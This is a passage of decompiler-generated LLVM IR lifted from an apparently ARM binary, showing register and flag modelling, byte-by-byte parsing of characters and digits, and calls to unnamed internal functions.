  store i32 %v3_94e4, i32* @r4, align 4
  store i32 0, i32* @lr, align 4
  %v1_94ec = load i32, i32* %sb.global-to-local, align 4
  %v2_94ec = add i32 %v1_94ec, %v3_94e4
  store i32 %v2_94ec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_94f0 = icmp slt i32 %v3_94e4, 0
  store i1 %v1_94f0, i1* %cpsr_n.global-to-local, align 1
  %v2_94f0 = icmp eq i32 %v3_94e4, 0
  store i1 %v2_94f0, i1* %cpsr_z.global-to-local, align 1
  %v3_94f4 = add i32 %v2_94ec, 2116
  %v4_94f4 = inttoptr i32 %v3_94f4 to i8*
  store i8 0, i8* %v4_94f4, align 1
  %v0_94f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_94f8, label %dec_label_pc_9510, label %dec_label_pc_94fc

dec_label_pc_94fc:                                ; preds = %dec_label_pc_94c8, %dec_label_pc_9460
  %v0_94fc = load i32, i32* @r8, align 4
  %v1_94fc = add i32 %v0_94fc, 8
  %v2_94fc = inttoptr i32 %v1_94fc to i32*
  %v3_94fc = load i32, i32* %v2_94fc, align 4
  store i32 %v3_94fc, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9500 = icmp slt i32 %v3_94fc, 0
  store i1 %v1_9500, i1* %cpsr_n.global-to-local, align 1
  %v2_9500 = icmp eq i32 %v3_94fc, 0
  store i1 %v2_9500, i1* %cpsr_z.global-to-local, align 1
  %v5_9504 = icmp sgt i32 %v3_94fc, 0
  br i1 %v5_9504, label %dec_label_pc_9478, label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94fc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9498

dec_label_pc_9510:                                ; preds = %dec_label_pc_94c8, %dec_label_pc_94c0
  %v0_9510 = load i32, i32* @r8, align 4
  %v1_9510 = add i32 %v0_9510, -1452
  %v2_9510 = inttoptr i32 %v1_9510 to i8*
  %v3_9510 = load i8, i8* %v2_9510, align 1
  %v4_9510 = zext i8 %v3_9510 to i32
  store i32 %v4_9510, i32* %r3.global-to-local, align 4
  %v2_9514 = icmp ugt i8 %v3_9510, 6
  store i1 %v2_9514, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9514 = icmp ult i8 %v3_9510, 7
  store i1 %v6_9514, i1* %cpsr_n.global-to-local, align 1
  %v7_9514 = icmp eq i8 %v3_9510, 7
  store i1 %v7_9514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9514, label %dec_label_pc_951c, label %dec_label_pc_8838

dec_label_pc_951c:                                ; preds = %dec_label_pc_9510
  %v1_951c = add i32 %v0_9510, 656
  %v2_951c = inttoptr i32 %v1_951c to i32*
  %v3_951c = load i32, i32* %v2_951c, align 4
  store i32 %v3_951c, i32* %r3.global-to-local, align 4
  %v1_9520 = add i32 %v3_951c, -1024
  %v2_9520 = icmp ugt i32 %v3_951c, 1023
  store i1 %v2_9520, i1* %cpsr_c.global-to-local, align 1
  %v3_9520 = sub i32 1023, %v3_951c
  %v4_9520 = and i32 %v3_9520, %v3_951c
  %v5_9520 = icmp slt i32 %v4_9520, 0
  store i1 %v5_9520, i1* %cpsr_v.global-to-local, align 1
  %v6_9520 = icmp slt i32 %v1_9520, 0
  store i1 %v6_9520, i1* %cpsr_n.global-to-local, align 1
  %v7_9520 = icmp eq i32 %v3_951c, 1024
  store i1 %v7_9520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9520, label %dec_label_pc_9528.loopexit, label %dec_label_pc_9430

dec_label_pc_9528.loopexit:                       ; preds = %dec_label_pc_951c
  %v0_9528.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_9528

dec_label_pc_9528:                                ; preds = %dec_label_pc_9528.loopexit, %dec_label_pc_940c
  %v0_9528 = phi i32 [ %v0_9528.pre, %dec_label_pc_9528.loopexit ], [ %v1_9428, %dec_label_pc_940c ]
  store i32 %v0_9528, i32* @r0, align 4
  %v1_952c = add i32 %v0_9528, 64
  store i32 %v1_952c, i32* @r1, align 4
  store i32 960, i32* @r2, align 4
  %v3_9534 = call i32 @function_134c0(i32 %v0_9528, i32 %v1_952c, i32 960)
  store i32 %v3_9534, i32* %r0.global-to-local, align 4
  %v0_9538 = load i32, i32* @r8, align 4
  %v1_9538 = add i32 %v0_9538, 656
  %v2_9538 = inttoptr i32 %v1_9538 to i32*
  %v3_9538 = load i32, i32* %v2_9538, align 4
  store i32 %v3_9538, i32* %r3.global-to-local, align 4
  %v1_953c = add i32 %v3_9538, -64
  store i32 %v1_953c, i32* @r4, align 4
  store i32 %v1_953c, i32* %v2_9538, align 4
  br label %dec_label_pc_9430

dec_label_pc_9548:                                ; preds = %dec_label_pc_9478
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v3_9550 = call i32 @function_11b24(i32 36, i32* null)
  %v0_9554 = load i32, i32* @r4, align 4
  store i32 %v0_9554, i32* %r1.global-to-local, align 4
  store i32 %v3_9550, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_9560 = load i32, i32* @r7, align 4
  store i32 %v0_9560, i32* %r0.global-to-local, align 4
  %v4_9564 = call i32 @function_125a0(i32 %v0_9560, i32 %v0_9554, i32 %v3_9550, i32 11)
  store i32 %v4_9564, i32* %r0.global-to-local, align 4
  %v2_9568 = add i32 %v4_9564, 1
  %v3_9568 = icmp eq i32 %v4_9564, -1
  store i1 %v3_9568, i1* %cpsr_c.global-to-local, align 1
  %v4_9568 = sub i32 0, %v4_9564
  %v5_9568 = and i32 %v2_9568, %v4_9568
  %v6_9568 = icmp slt i32 %v5_9568, 0
  store i1 %v6_9568, i1* %cpsr_v.global-to-local, align 1
  %v7_9568 = icmp slt i32 %v2_9568, 0
  store i1 %v7_9568, i1* %cpsr_n.global-to-local, align 1
  %v8_9568 = icmp eq i32 %v2_9568, 0
  store i1 %v8_9568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9568, label %dec_label_pc_9570, label %dec_label_pc_9ad4

dec_label_pc_9570:                                ; preds = %dec_label_pc_9548
  %v0_9570 = load i32, i32* @r8, align 4
  %v1_9570 = add i32 %v0_9570, 8
  %v2_9570 = inttoptr i32 %v1_9570 to i32*
  %v3_9570 = load i32, i32* %v2_9570, align 4
  store i32 %v3_9570, i32* @r6, align 4
  br label %dec_label_pc_9498

dec_label_pc_9578:                                ; preds = %dec_label_pc_94a0
  %v0_9578 = load i32, i32* @r7, align 4
  store i32 %v0_9578, i32* %r0.global-to-local, align 4
  %v1_957c = add i32 %v0_94a0, 656
  %v2_957c = inttoptr i32 %v1_957c to i32*
  %v3_957c = load i32, i32* %v2_957c, align 4
  store i32 %v3_957c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9588 = call i32 @function_125a0(i32 %v0_9578, i32 %v3_957c, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32 2)
  store i32 %v5_9588, i32* %r0.global-to-local, align 4
  %v1_958c = add i32 %v5_9588, 1
  %v2_958c = icmp eq i32 %v5_9588, -1
  store i1 %v2_958c, i1* %cpsr_c.global-to-local, align 1
  %v3_958c = sub i32 0, %v5_9588
  %v4_958c = and i32 %v1_958c, %v3_958c
  %v5_958c = icmp slt i32 %v4_958c, 0
  store i1 %v5_958c, i1* %cpsr_v.global-to-local, align 1
  %v6_958c = icmp slt i32 %v1_958c, 0
  store i1 %v6_958c, i1* %cpsr_n.global-to-local, align 1
  %v7_958c = icmp eq i32 %v1_958c, 0
  store i1 %v7_958c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_958c, label %dec_label_pc_94c0, label %dec_label_pc_9594

dec_label_pc_9594:                                ; preds = %dec_label_pc_9578
  %v0_9594 = load i32, i32* @r8, align 4
  %v1_9594 = add i32 %v0_9594, 656
  %v2_9594 = inttoptr i32 %v1_9594 to i32*
  %v3_9594 = load i32, i32* %v2_9594, align 4
  store i32 %v3_9594, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_95a0 = load i32, i32* @r7, align 4
  store i32 %v0_95a0, i32* %r0.global-to-local, align 4
  %v5_95a4 = call i32 @function_125a0(i32 %v0_95a0, i32 %v3_9594, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32 2)
  %v1_95a8 = load i32, i32* %sb.global-to-local, align 4
  %v2_95a8 = add i32 %v1_95a8, %v5_95a4
  store i32 %v2_95a8, i32* %ip.global-to-local, align 4
  store i32 %v5_95a4, i32* @r5, align 4
  store i32 %v5_95a4, i32* %r1.global-to-local, align 4
  %v0_95b4 = load i32, i32* @r7, align 4
  store i32 %v0_95b4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1577c.42 to i32), i32* %r2.global-to-local, align 4
  %v0_95bc = load i32, i32* @r4, align 4
  store i32 %v0_95bc, i32* %r3.global-to-local, align 4
  %v0_95c0 = load i32, i32* @r6, align 4
  %v1_95c0 = trunc i32 %v0_95c0 to i8
  %v3_95c0 = add i32 %v2_95a8, 2114
  %v4_95c0 = inttoptr i32 %v3_95c0 to i8*
  store i8 %v1_95c0, i8* %v4_95c0, align 1
  %v4_95c4 = call i32 @function_125a0(i32 %v0_95b4, i32 %v5_95a4, i32 ptrtoint (i32* @global_var_1577c.42 to i32), i32 %v0_95bc)
  store i32 %v4_95c4, i32* %r0.global-to-local, align 4
  %v1_95c8 = add i32 %v4_95c4, 1
  %v2_95c8 = icmp eq i32 %v4_95c4, -1
  store i1 %v2_95c8, i1* %cpsr_c.global-to-local, align 1
  %v3_95c8 = sub i32 0, %v4_95c4
  %v4_95c8 = and i32 %v1_95c8, %v3_95c8
  %v5_95c8 = icmp slt i32 %v4_95c8, 0
  store i1 %v5_95c8, i1* %cpsr_v.global-to-local, align 1
  %v6_95c8 = icmp slt i32 %v1_95c8, 0
  store i1 %v6_95c8, i1* %cpsr_n.global-to-local, align 1
  %v7_95c8 = icmp eq i32 %v1_95c8, 0
  store i1 %v7_95c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95c8, label %dec_label_pc_95ec, label %dec_label_pc_95d0

dec_label_pc_95d0:                                ; preds = %dec_label_pc_9594
  %v0_95d0 = load i32, i32* @r7, align 4
  store i32 %v0_95d0, i32* %r0.global-to-local, align 4
  %v0_95d4 = load i32, i32* @r5, align 4
  store i32 %v0_95d4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1577c.42 to i32), i32* %r2.global-to-local, align 4
  %v0_95dc = load i32, i32* @r4, align 4
  store i32 %v0_95dc, i32* %r3.global-to-local, align 4
  %v4_95e0 = call i32 @function_125a0(i32 %v0_95d0, i32 %v0_95d4, i32 ptrtoint (i32* @global_var_1577c.42 to i32), i32 %v0_95dc)
  %v1_95e4 = load i32, i32* %sb.global-to-local, align 4
  %v2_95e4 = add i32 %v1_95e4, %v4_95e0
  store i32 %v2_95e4, i32* %r0.global-to-local, align 4
  %v0_95e8 = load i32, i32* @r6, align 4
  %v1_95e8 = trunc i32 %v0_95e8 to i8
  %v3_95e8 = add i32 %v2_95e4, 2116
  %v4_95e8 = inttoptr i32 %v3_95e8 to i8*
  store i8 %v1_95e8, i8* %v4_95e8, align 1
  br label %dec_label_pc_95ec

dec_label_pc_95ec:                                ; preds = %dec_label_pc_9594, %dec_label_pc_95d0
  %v0_95ec = load i32, i32* @r7, align 4
  store i32 %v0_95ec, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_95f4 = inttoptr i32 %v0_95ec to i8*
  %v3_95f4 = call i32 @function_12608(i8* %v2_95f4, i32 16)
  store i32 %v3_95f4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_95f8 = icmp slt i32 %v3_95f4, 0
  store i1 %v1_95f8, i1* %cpsr_n.global-to-local, align 1
  %v2_95f8 = icmp eq i32 %v3_95f4, 0
  store i1 %v2_95f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f8, label %dec_label_pc_9d84, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %dec_label_pc_95ec
  %v1_9600 = add i32 %v3_95f4, 2
  store i32 %v1_9600, i32* %r6.global-to-local, align 4
  %v1_9604 = load i32, i32* @r8, align 4
  %v2_9604 = add i32 %v1_9604, 8
  %v3_9604 = inttoptr i32 %v2_9604 to i32*
  store i32 %v1_9600, i32* %v3_9604, align 4
  br label %dec_label_pc_94c0

dec_label_pc_960c:                                ; preds = %dec_label_pc_8cb4
  %v0_960c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_960c, i32* %r1.global-to-local, align 4
  %v0_9610 = load i32, i32* @r6, align 4
  store i32 %v0_9610, i32* @r0, align 4
  %v2_9614 = inttoptr i32 %v0_9610 to i8*
  %v3_9614 = call i32 @function_12504(i8* %v2_9614, i32 %v0_960c)
  store i32 %v3_9614, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8ccc

dec_label_pc_961c:                                ; preds = %dec_label_pc_8830
  %v0_961c = call i32 @function_13470()
  store i32 %v0_961c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v0_961c, i32* @r4, align 4
  br label %dec_label_pc_9628

dec_label_pc_9628:                                ; preds = %dec_label_pc_9648.dec_label_pc_9628_crit_edge, %dec_label_pc_961c
  %v1_9628 = phi i32 [ %v1_9628.pre, %dec_label_pc_9648.dec_label_pc_9628_crit_edge ], [ %v0_961c, %dec_label_pc_961c ]
  %v0_9628 = phi i32 [ %v0_9628.pre, %dec_label_pc_9648.dec_label_pc_9628_crit_edge ], [ 0, %dec_label_pc_961c ]
  %v2_9628 = inttoptr i32 %v1_9628 to i32*
  store i32 %v0_9628, i32* %v2_9628, align 4
  store i32 %v2_8280, i32* %r1.global-to-local, align 4
  %v0_9630 = load i32, i32* @r8, align 4
  %v1_9630 = add i32 %v0_9630, -1456
  %v2_9630 = inttoptr i32 %v1_9630 to i32*
  %v3_9630 = load i32, i32* %v2_9630, align 4
  store i32 %v3_9630, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_963c = call i32 @function_136a0(i32 %v3_9630, i32* nonnull %stack_var_-20809, i32 10240, i32 16384)
  store i32 %v5_963c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9640 = icmp slt i32 %v5_963c, 0
  store i1 %v1_9640, i1* %cpsr_n.global-to-local, align 1
  %v2_9640 = icmp eq i32 %v5_963c, 0
  store i1 %v2_9640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9640, label %dec_label_pc_9920, label %dec_label_pc_9648

dec_label_pc_9648:                                ; preds = %dec_label_pc_9628
  %v2_9648 = add i32 %v5_963c, 1
  %v3_9648 = icmp eq i32 %v5_963c, -1
  store i1 %v3_9648, i1* %cpsr_c.global-to-local, align 1
  %v4_9648 = sub i32 0, %v5_963c
  %v5_9648 = and i32 %v2_9648, %v4_9648
  %v6_9648 = icmp slt i32 %v5_9648, 0
  store i1 %v6_9648, i1* %cpsr_v.global-to-local, align 1
  %v7_9648 = icmp slt i32 %v2_9648, 0
  store i1 %v7_9648, i1* %cpsr_n.global-to-local, align 1
  %v8_9648 = icmp eq i32 %v2_9648, 0
  store i1 %v8_9648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9648, label %dec_label_pc_9650, label %dec_label_pc_9648.dec_label_pc_9628_crit_edge

dec_label_pc_9648.dec_label_pc_9628_crit_edge:    ; preds = %dec_label_pc_9648
  %v0_9628.pre = load i32, i32* @r5, align 4
  %v1_9628.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9628

dec_label_pc_9650:                                ; preds = %dec_label_pc_9648
  %v0_9650 = load i32, i32* @r4, align 4
  %v1_9650 = inttoptr i32 %v0_9650 to i32*
  %v2_9650 = load i32, i32* %v1_9650, align 4
  store i32 %v2_9650, i32* %r3.global-to-local, align 4
  %v1_9654 = add i32 %v2_9650, -11
  %v2_9654 = icmp ugt i32 %v2_9650, 10
  store i1 %v2_9654, i1* %cpsr_c.global-to-local, align 1
  %v3_9654 = sub i32 10, %v2_9650
  %v4_9654 = and i32 %v3_9654, %v2_9650
  %v5_9654 = icmp slt i32 %v4_9654, 0
  store i1 %v5_9654, i1* %cpsr_v.global-to-local, align 1
  %v6_9654 = icmp slt i32 %v1_9654, 0
  store i1 %v6_9654, i1* %cpsr_n.global-to-local, align 1
  %v7_9654 = icmp eq i32 %v2_9650, 11
  store i1 %v7_9654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9654, label %dec_label_pc_9a98, label %dec_label_pc_965c

dec_label_pc_965c:                                ; preds = %dec_label_pc_9650, %dec_label_pc_9920
  %v0_965c = load i32, i32* @r8, align 4
  %v1_965c = add i32 %v0_965c, -1456
  %v2_965c = inttoptr i32 %v1_965c to i32*
  %v3_965c = load i32, i32* %v2_965c, align 4
  store i32 %v3_965c, i32* %r0.global-to-local, align 4
  %v1_9660 = call i32 @function_12e9c(i32 %v3_965c)
  store i32 %v1_9660, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_966c = load i32, i32* @r8, align 4
  %v2_966c = add i32 %v1_966c, -1456
  %v3_966c = inttoptr i32 %v2_966c to i32*
  store i32 -1, i32* %v3_966c, align 4
  %v0_9670 = load i32, i32* %r1.global-to-local, align 4
  %v1_9670 = trunc i32 %v0_9670 to i8
  %v2_9670 = load i32, i32* @r8, align 4
  %v3_9670 = add i32 %v2_9670, -1452
  %v4_9670 = inttoptr i32 %v3_9670 to i8*
  store i8 %v1_9670, i8* %v4_9670, align 1
  br label %dec_label_pc_8838

dec_label_pc_9678:                                ; preds = %dec_label_pc_934c, %dec_label_pc_9328
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_9680 = call i32 @function_11b24(i32 37, i32* null)
  %v0_9684 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9684, i32* @r1, align 4
  store i32 %v3_9680, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_9690 = call i32 @function_12830(i8* %tmp199, i32 %v0_9684, i32 %v3_9680)
  store i32 %v4_9690, i32* %r0.global-to-local, align 4
  %v1_9698 = add i32 %v4_9690, 1
  %v2_9698 = icmp eq i32 %v4_9690, -1
  store i1 %v2_9698, i1* %cpsr_c.global-to-local, align 1
  %v3_9698 = sub i32 0, %v4_9690
  %v4_9698 = and i32 %v1_9698, %v3_9698
  %v5_9698 = icmp slt i32 %v4_9698, 0
  store i1 %v5_9698, i1* %cpsr_v.global-to-local, align 1
  %v6_9698 = icmp slt i32 %v1_9698, 0
  store i1 %v6_9698, i1* %cpsr_n.global-to-local, align 1
  %v7_9698 = icmp eq i32 %v1_9698, 0
  store i1 %v7_9698, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_9698, label %dec_label_pc_98c0, label %dec_label_pc_96a4

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9678
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_96ac = call i32 @function_11b24(i32 37, i32* null)
  %v0_96b0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_96b0, i32* @r1, align 4
  store i32 %v3_96ac, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_96bc = call i32 @function_12830(i8* %tmp199, i32 %v0_96b0, i32 %v3_96ac)
  store i32 %v4_96bc, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v2_96c8 = add i32 %v4_96bc, %v2_8748
  store i32 %v2_96c8, i32* %r3.global-to-local, align 4
  %v1_96cc = load i32, i32* @r5, align 4
  %v2_96cc = add i32 %v1_96cc, %v2_96c8
  %v3_96cc = inttoptr i32 %v2_96cc to i8*
  %v4_96cc = load i8, i8* %v3_96cc, align 1
  store i32 %v2_8280, i32* %lr.global-to-local, align 4
  %v2_96d4 = icmp ugt i8 %v4_96cc, 31
  store i1 %v2_96d4, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_96d4 = icmp ult i8 %v4_96cc, 32
  store i1 %v6_96d4, i1* %cpsr_n.global-to-local, align 1
  %v7_96d4 = icmp eq i8 %v4_96cc, 32
  store i1 %v7_96d4, i1* %cpsr_z.global-to-local, align 1
  %v2_96dc = zext i1 %v7_96d4 to i32
  %v2_96dc.v4_96bc = add i32 %v2_96dc, %v4_96bc
  store i32 %v2_96dc.v4_96bc, i32* @r4, align 4
  %v2_96e0 = add i32 %v2_96dc.v4_96bc, %v2_8280
  store i32 %v2_96e0, i32* @r6, align 4
  store i32 %v2_96e0, i32* %r0.global-to-local, align 4
  %v1_96e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_96e8 = sub i32 %v1_96e8, %v2_96dc.v4_96bc
  store i32 %v2_96e8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_96f4 = call i32 @function_125a0(i32 %v2_96e0, i32 %v2_96e8, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32 2)
  store i32 %v5_96f4, i32* %r0.global-to-local, align 4
  %v1_96f8 = add i32 %v5_96f4, 1
  %v2_96f8 = icmp eq i32 %v5_96f4, -1
  store i1 %v2_96f8, i1* %cpsr_c.global-to-local, align 1
  %v3_96f8 = sub i32 0, %v5_96f4
  %v4_96f8 = and i32 %v1_96f8, %v3_96f8
  %v5_96f8 = icmp slt i32 %v4_96f8, 0
  store i1 %v5_96f8, i1* %cpsr_v.global-to-local, align 1
  %v6_96f8 = icmp slt i32 %v1_96f8, 0
  store i1 %v6_96f8, i1* %cpsr_n.global-to-local, align 1
  %v7_96f8 = icmp eq i32 %v1_96f8, 0
  store i1 %v7_96f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_96f4, i32* @r7, align 4
  br i1 %v7_96f8, label %dec_label_pc_98c0, label %dec_label_pc_9704

dec_label_pc_9704:                                ; preds = %dec_label_pc_96a4
  store i32 %v2_8748, i32* %r1.global-to-local, align 4
  %v1_970c = load i32, i32* @r4, align 4
  %v2_970c = add i32 %v1_970c, %v2_8748
  %v1_9710 = add i32 %v5_96f4, -1
  %v2_9710 = icmp ne i32 %v5_96f4, 0
  store i1 %v2_9710, i1* %cpsr_c.global-to-local, align 1
  %v3_9710 = sub i32 0, %v5_96f4
  %v4_9710 = and i32 %v5_96f4, %v3_9710
  %v5_9710 = icmp slt i32 %v4_9710, 0
  store i1 %v5_9710, i1* %cpsr_v.global-to-local, align 1
  %v6_9710 = icmp slt i32 %v1_9710, 0
  store i1 %v6_9710, i1* %cpsr_n.global-to-local, align 1
  %v7_9710 = icmp eq i32 %v5_96f4, 1
  store i1 %v7_9710, i1* %cpsr_z.global-to-local, align 1
  %v1_9714 = add i32 %v2_970c, -20736
  store i32 %v1_9714, i32* %r3.global-to-local, align 4
  %v7_9718 = icmp sgt i32 %v5_96f4, 1
  br i1 %v7_9718, label %bb231, label %bb232

bb231:                                            ; preds = %dec_label_pc_9704
  %v9_9718 = add i32 %v5_96f4, -2
  store i32 %v9_9718, i32* @r7, align 4
  br label %bb232

bb232:                                            ; preds = %dec_label_pc_9704, %bb231
  %v3_9724 = phi i32 [ %v5_96f4, %dec_label_pc_9704 ], [ %v9_9718, %bb231 ]
  %v1_971c = add i32 %v2_970c, -20773
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_9724 = add i32 %v1_971c, %v3_9724
  %v5_9724 = inttoptr i32 %v4_9724 to i8*
  store i8 0, i8* %v5_9724, align 1
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 %v2_8280, i32* @lr, align 4
  %v1_9738 = load i32, i32* @r4, align 4
  %v2_9738 = add i32 %v1_9738, %v2_8280
  %v3_9738 = inttoptr i32 %v2_9738 to i8*
  %v4_9738 = load i8, i8* %v3_9738, align 1
  %v6_9738 = zext i8 %v4_9738 to i32
  store i32 %v6_9738, i32* %r0.global-to-local, align 4
  %v1_973c = add nsw i32 %v6_9738, -48
  store i32 %v1_973c, i32* %r3.global-to-local, align 4
  %v2_9740 = icmp ugt i32 %v1_973c, 8
  store i1 %v2_9740, i1* %cpsr_c.global-to-local, align 1
  %v3_9740 = sub nsw i32 56, %v6_9738
  %v4_9740 = and i32 %v3_9740, %v1_973c
  %v5_9740 = icmp slt i32 %v4_9740, 0
  store i1 %v5_9740, i1* %cpsr_v.global-to-local, align 1
  %v6_9740 = icmp ult i8 %v4_9738, 57
  store i1 %v6_9740, i1* %cpsr_n.global-to-local, align 1
  %v7_9740 = icmp eq i32 %v1_973c, 9
  store i1 %v7_9740, i1* %cpsr_z.global-to-local, align 1
  %v2_9744 = xor i1 %v7_9740, true
  %v3_9744 = and i1 %v2_9740, %v2_9744
  br i1 %v3_9744, label %.thread142, label %dec_label_pc_974c

.thread142:                                       ; preds = %bb232
  %v4_9744 = load i32, i32* @r6, align 4
  br label %dec_label_pc_9774

dec_label_pc_974c:                                ; preds = %bb232
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_975c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_9750

dec_label_pc_9750:                                ; preds = %dec_label_pc_9750, %dec_label_pc_974c
  %v0_9750 = phi i32 [ %v1_9750, %dec_label_pc_9750 ], [ 0, %dec_label_pc_974c ]
  %v1_9750 = add i32 %v0_9750, 1
  store i32 %v1_9750, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 %v1_9750, i32* %stack_var_-40, align 4
  %v2_975c = add i32 %v1_9750, %v1_975c.pre
  %v3_975c = inttoptr i32 %v2_975c to i8*
  %v4_975c = load i8, i8* %v3_975c, align 1
  %v6_975c = zext i8 %v4_975c to i32
  store i32 %v6_975c, i32* %r0.global-to-local, align 4
  %v1_9760 = add nsw i32 %v6_975c, -48
  %v2_9764 = icmp ugt i32 %v1_9760, 8
  store i1 %v2_9764, i1* %cpsr_c.global-to-local, align 1
  %v3_9764 = sub nsw i32 56, %v6_975c
  %v4_9764 = and i32 %v3_9764, %v1_9760
  %v5_9764 = icmp slt i32 %v4_9764, 0
  store i1 %v5_9764, i1* %cpsr_v.global-to-local, align 1
  %v6_9764 = icmp ult i8 %v4_975c, 57
  store i1 %v6_9764, i1* %cpsr_n.global-to-local, align 1
  %v7_9764 = icmp eq i32 %v1_9760, 9
  store i1 %v7_9764, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9750, i32* %r3.global-to-local, align 4
  %v2_976c = xor i1 %v2_9764, true
  %v3_976c = or i1 %v7_9764, %v2_976c
  br i1 %v3_976c, label %dec_label_pc_9750, label %dec_label_pc_9774

dec_label_pc_9774:                                ; preds = %dec_label_pc_9750, %.thread142
  %v2_9780 = phi i32 [ %v4_9744, %.thread142 ], [ %v2_975c, %dec_label_pc_9750 ]
  %v0_9774 = phi i32 [ %v6_9738, %.thread142 ], [ %v6_975c, %dec_label_pc_9750 ]
  store i32 %v2_9780, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_9774 = icmp eq i32 %v0_9774, 0
  store i1 %v2_9774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9774, label %dec_label_pc_98c0, label %dec_label_pc_977c

dec_label_pc_977c:                                ; preds = %dec_label_pc_9774
  store i32 0, i32* @r5, align 4
  %v3_9780 = inttoptr i32 %v2_9780 to i8*
  store i8 0, i8* %v3_9780, align 1
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9788 = load i32, i32* %stack_var_-40, align 4
  %v1_978c = add i32 %v3_9788, 1
  store i32 %v1_978c, i32* %ip.global-to-local, align 4
  store i32 %v1_978c, i32* %stack_var_-40, align 4
  %v0_9794 = load i32, i32* @r6, align 4
  %v2_9794 = add i32 %v0_9794, %v1_978c
  %v3_9794 = inttoptr i32 %v2_9794 to i8*
  %v4_9794 = load i8, i8* %v3_9794, align 1
  %v6_9794 = zext i8 %v4_9794 to i32
  store i32 %v6_9794, i32* %r3.global-to-local, align 4
  %v2_9798 = icmp ugt i8 %v4_9794, 31
  store i1 %v2_9798, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9798 = icmp ult i8 %v4_9794, 32
  store i1 %v6_9798, i1* %cpsr_n.global-to-local, align 1
  %v7_9798 = icmp eq i8 %v4_9794, 32
  store i1 %v7_9798, i1* %cpsr_z.global-to-local, align 1
